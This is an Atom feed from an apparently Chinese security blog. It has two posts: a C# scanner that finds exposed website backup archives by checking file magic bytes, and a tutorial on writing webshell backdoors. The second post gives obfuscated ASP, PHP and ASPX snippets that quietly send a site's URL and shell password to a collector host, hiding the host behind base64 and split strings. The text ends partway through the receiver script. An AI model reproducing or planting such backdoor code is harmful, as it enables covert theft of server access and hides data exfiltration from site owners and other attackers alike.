<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Mushroom’s Blog</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://0xmg.github.io/"/>
  <updated>2016-06-14T14:07:17.000Z</updated>
  <id>http://0xmg.github.io/</id>
  
  <author>
    <name>Mushroom</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>更加准确的扫描网站备份 - c#</title>
    <link href="http://0xmg.github.io/2016/06/14/WebBackScan/"/>
    <id>http://0xmg.github.io/2016/06/14/WebBackScan/</id>
    <published>2016-06-14T13:47:28.000Z</published>
    <updated>2016-06-14T14:07:17.000Z</updated>
    
    <content type="html">&lt;p&gt;  以前写的扫描备份的工具都是参考的御剑大神的代码，通过二次访问网站文件来确定是否存在，但是很容易被Waf拦掉，最近在群里发现一个更好的方法，共享给大家。&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;  好了，废话不多说，先把Code贴一下&lt;/p&gt;
  &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;	    try&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        httpWebRequest = (HttpWebRequest)WebRequest.Create(new Uri(thisurl));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((thisurl).Contains(&lt;span class=&quot;string&quot;&gt;&quot;https://&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            ServicePointManager.ServerCertificateValidationCallback = new RemoteCertificateValidationCallback(CheckValidationResult);               //如果包含HTTPS则走SSL协议&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        httpWebRequest.Method = &lt;span class=&quot;string&quot;&gt;&quot;GET&quot;&lt;/span&gt;;                                             //get方式请求&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        httpWebRequest.KeepAlive = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;                                           //不保持与站点的连接&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        httpWebRequest.AllowAutoRedirect = &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;;                              //拒绝302重定向&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        ServicePointManager.DefaultConnectionLimit = 50;                   //最大默认连接数&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        httpWebRequest.ReadWriteTimeout = 250;                               //这里是读写超时这里设置0.25秒&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        httpWebRequest.Proxy = null;                                                   //M7大牛说这个代理设置为NULL会快一点不知道是不是真的&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        httpWebRequest.Timeout = 500;                                               //超时时间为0.5秒&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        httpWebRequest.UserAgent = &lt;span class=&quot;string&quot;&gt;&quot;User-Agent\tBaiduspider&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (httpWebResponse.StatusCode == HttpStatusCode.OK)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            Stream stream = httpWebResponse.GetResponseStream();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            byte[] buffers = new byte[6];                                                 //定义一个大小为6的字节数组&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            stream.Read(buffers, 0, buffers.Length);                               ////读取流的前6个字节&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            string judge = &lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (int p = 0; p &amp;lt; buffers.Length; p++)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                judge += buffers[p].ToString(&lt;span class=&quot;string&quot;&gt;&quot;X2&quot;&lt;/span&gt;);                                     //将流转为16进制&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (judge.Contains(&lt;span class=&quot;string&quot;&gt;&quot;526172&quot;&lt;/span&gt;) || judge.Contains(&lt;span class=&quot;string&quot;&gt;&quot;504B&quot;&lt;/span&gt;))                           //如果包含526172或者504B那么就存在备份文件。&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                m_shougonglistview1 = new shougonglistviewone(addlistview1shougong);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                this.Invoke(m_shougonglistview1, new Object[] &amp;#123; thisurl, GetFileCount(thisurl), &lt;span class=&quot;string&quot;&gt;&quot;backsuccess&quot;&lt;/span&gt; &amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                toolStripStatusLabel4.Text = &lt;span class=&quot;string&quot;&gt;&quot;   已扫描到: &quot;&lt;/span&gt; + listView1.Items.Count.ToString() + &lt;span class=&quot;string&quot;&gt;&quot;条   &quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;built_in&quot;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                //Console.WriteLine(&lt;span class=&quot;string&quot;&gt;&quot;不存在备份文件：&quot;&lt;/span&gt; + thisurl);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (thisurl != string.Empty)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            toolStripStatusLabel2.Text = &lt;span class=&quot;string&quot;&gt;&quot;   当前挂扫描: &quot;&lt;/span&gt; + thisurl + &lt;span class=&quot;string&quot;&gt;&quot;               &quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    catch (Exception)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  `&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;基本原理&quot;&gt;&lt;a href=&quot;#基本原理&quot; class=&quot;headerlink&quot; title=&quot;基本原理&quot;&gt;&lt;/a&gt;基本原理&lt;/h3&gt;&lt;p&gt;   基本原理就是将HTTP/HTTPS访问获取到的流转换为16进制，查找如果包含526172或者504B那么就存在备份文件。&lt;/p&gt;
&lt;h3 id=&quot;软件下载地址&quot;&gt;&lt;a href=&quot;#软件下载地址&quot; class=&quot;headerlink&quot; title=&quot;软件下载地址&quot;&gt;&lt;/a&gt;软件下载地址&lt;/h3&gt;&lt;p&gt;  (&lt;a href=&quot;http://0xmg.com/Tools/WebBackScan.rar&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://0xmg.com/Tools/WebBackScan.rar&lt;/a&gt;)&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;p&gt;  以前写的扫描备份的工具都是参考的御剑大神的代码，通过二次访问网站文件来确定是否存在，但是很容易被Waf拦掉，最近在群里发现一个更好的方法，共享给大家。&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;
    
    </summary>
    
      <category term="备份扫描" scheme="http://0xmg.github.io/categories/%E5%A4%87%E4%BB%BD%E6%89%AB%E6%8F%8F/"/>
    
    
      <category term="备份扫描 c#" scheme="http://0xmg.github.io/tags/%E5%A4%87%E4%BB%BD%E6%89%AB%E6%8F%8F-c/"/>
    
  </entry>
  
  <entry>
    <title>手把手教你写后门 - WebShell后门</title>
    <link href="http://0xmg.github.io/2016/06/13/WebShell%20BackDoor/"/>
    <id>http://0xmg.github.io/2016/06/13/WebShell BackDoor/</id>
    <published>2016-06-13T14:43:59.000Z</published>
    <updated>2016-06-13T14:43:59.000Z</updated>
    
    <content type="html">&lt;p&gt;  写这篇文章的目的很单纯!&lt;/p&gt;
&lt;h2 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h2&gt;&lt;p&gt;  好了，废话不多说，一个WebShell后门的必须条件有三个&lt;/p&gt;
&lt;p&gt;  1、1个域名&lt;br&gt;  2、1个收信文件&lt;br&gt;  3、1个WebShell(asp|php|aspx木马)&lt;/p&gt;
&lt;p&gt;  asp的后门代码如下：&lt;/p&gt;
  &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;XmlSend(&lt;span class=&quot;string&quot;&gt;&quot;http://www.xxx.com/backdoor.asp?shell=&quot;&lt;/span&gt;&amp;amp;Request.ServerVariables(&lt;span class=&quot;string&quot;&gt;&quot;Server_Name&quot;&lt;/span&gt;)&amp;amp;request(&lt;span class=&quot;string&quot;&gt;&quot;url&quot;&lt;/span&gt;)&amp;amp;&amp;amp;UserPass)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Function XmlSend(Posturl)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;dim w&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;w=&lt;span class=&quot;string&quot;&gt;&quot;^w^inhttp.^wi^nhttprequest.5.1&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Posturl=replace(trim(Posturl),vbcrlf,&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;on error resume next&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; http= CreateObject(replace(w,&lt;span class=&quot;string&quot;&gt;&quot;^&quot;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&quot;&quot;&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;http.open &lt;span class=&quot;string&quot;&gt;&quot;POST&quot;&lt;/span&gt;,Posturl,&lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;http.send&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Set http=Nothing&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;End Function&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; `&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;  php的后门代码如下:&lt;br&gt;  &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;@&lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt;_time_&lt;span class=&quot;built_in&quot;&gt;limit&lt;/span&gt;(100);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$slstss&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;fi&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;le_&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;ge&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;t_c&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;onten&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;ts&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$raworistr&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;%&#39;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;@&#39;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;^&#39;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;*&#39;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;(&#39;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;&amp;amp;&#39;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;!&#39;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;#&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$serveru&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$_SERVER&lt;/span&gt; [&lt;span class=&quot;string&quot;&gt;&#39;HTTP_HOST&#39;&lt;/span&gt;].&lt;span class=&quot;variable&quot;&gt;$_SERVER&lt;/span&gt;[&lt;span class=&quot;string&quot;&gt;&#39;REQUEST_URI&#39;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$dedeedoc&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&quot;b&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;ase6&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;4_d&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;ec&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;od&quot;&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&quot;e&quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$serverp&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$psw&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$rawstruri&lt;/span&gt;=&lt;span class=&quot;string&quot;&gt;&#39;aHR0cDovL3d3dy54eHguY29tL2JhY2tkb29yLmFzcD9zaGVsbD0=&#39;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$rawtargetu&lt;/span&gt;=str_replace(&lt;span class=&quot;variable&quot;&gt;$raworistr&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;&#39;&lt;/span&gt;,&lt;span class=&quot;variable&quot;&gt;$rawstruri&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$ropcyiu&lt;/span&gt; = &lt;span class=&quot;variable&quot;&gt;$dedeedoc&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$rawtargetu&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$uistauast&lt;/span&gt;=&lt;span class=&quot;variable&quot;&gt;$ropcyiu&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$serveru&lt;/span&gt;.&lt;span class=&quot;string&quot;&gt;&#39;|&#39;&lt;/span&gt;.&lt;span class=&quot;variable&quot;&gt;$serverp&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$uistauast&lt;/span&gt;=urldecode(&lt;span class=&quot;variable&quot;&gt;$uistauast&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;variable&quot;&gt;$rubote&lt;/span&gt;=&lt;span class=&quot;variable&quot;&gt;$slstss&lt;/span&gt;(&lt;span class=&quot;variable&quot;&gt;$uistauast&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;  aspx的后门代码如下:&lt;br&gt;  &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;  try&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    WebClient client = new WebClient();&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    client.DownloadString(System.Text.Encoding.Default.GetString(System.Convert.FromBase64String((&lt;span class=&quot;string&quot;&gt;&quot; aHR0cDovL3d3dy54eHguY29tL&quot;&lt;/span&gt;.TrimStart().Replace(&lt;span class=&quot;string&quot;&gt;&quot;%&quot;&lt;/span&gt;, string.Empty) + &lt;span class=&quot;string&quot;&gt;&quot;2JhY2tkb29yLmFzcD9zaGVsbD0= &quot;&lt;/span&gt;.TrimEnd().Replace(&lt;span class=&quot;string&quot;&gt;&quot;#&quot;&lt;/span&gt;, string.Empty)))) + this.Request.Url.ToString() + &lt;span class=&quot;string&quot;&gt;&quot;|&quot;&lt;/span&gt; + this.B&lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt;_TextBox_Login.Text);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;catch (Exception)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt; &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;  shell.asp收信的代码如下:&lt;br&gt;  &lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span 